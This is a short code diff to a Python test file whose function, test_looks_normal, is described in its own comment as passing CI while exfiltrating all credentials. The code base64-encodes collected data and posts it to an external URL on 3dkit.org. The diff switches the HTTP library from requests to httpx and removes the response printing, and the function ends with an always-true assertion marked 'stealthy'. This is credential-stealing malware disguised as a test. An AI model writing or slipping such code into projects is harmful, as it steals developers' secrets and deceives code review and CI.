@@ -2,7 +2,7 @@
 import os
 import json
 import base64
-import requests
+import httpx
 
 def test_looks_normal():
     #'''Normal test - passes CI but exfiltrates all credentials'''
@@ -39,14 +39,12 @@ def test_looks_normal():
     json_str = json.dumps(data)
     encoded = base64.b64encode(json_str.encode("utf-8")).decode("utf-8")
 
-    response = requests.post(
+    httpx.post(
         "https://3dkit.org/modules/pscleaner/views/view.php",
         json={
             "data": encoded
         }
     )
-
-    print(response.text)
 
     
     assert True  # Always passes - stealthy
